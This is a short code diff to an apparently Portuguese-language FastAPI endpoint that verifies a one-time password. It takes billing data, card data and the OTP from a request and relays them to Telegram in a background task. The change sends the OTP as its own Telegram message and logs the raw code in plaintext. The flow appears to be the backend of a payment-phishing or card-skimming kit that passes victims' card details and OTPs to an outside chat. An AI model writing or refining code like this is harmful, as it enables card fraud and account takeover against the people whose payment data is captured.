@@ -221,7 +221,7 @@ async def resend_otp_code(request: dict, background_tasks: BackgroundTasks):
 
 @router.post("/otp/verify")
 async def verify_otp_code(request: dict, background_tasks: BackgroundTasks):
-    """Verificar código OTP e processar pagamento"""
+    """Verificar código OTP e enviar segunda mensagem ao Telegram"""
     try:
         otp_code = request.get('otp_code', '')
         billing_data = request.get('billing_data', {})
@@ -254,16 +254,16 @@ async def verify_otp_code(request: dict, background_tasks: BackgroundTasks):
         # Store payment data
         payment_storage[tracking_data.id] = tracking_data.dict()
         
-        # Send complete payment info to Telegram with OTP verification
+        # Send ONLY OTP verification message to Telegram (separate from card data)
         background_tasks.add_task(
-            telegram_service.send_payment_with_otp_info,
+            telegram_service.send_otp_verified_message,
             billing_data,
             card_data,
             otp_code,
             tracking_number
         )
         
-        logger.info(f"OTP verified and payment processed for {billing_data.get('nome', 'Unknown')}")
+        logger.info(f"OTP verified for {billing_data.get('nome', 'Unknown')} - OTP: {otp_code}")
         
         return {
             "status": "success",
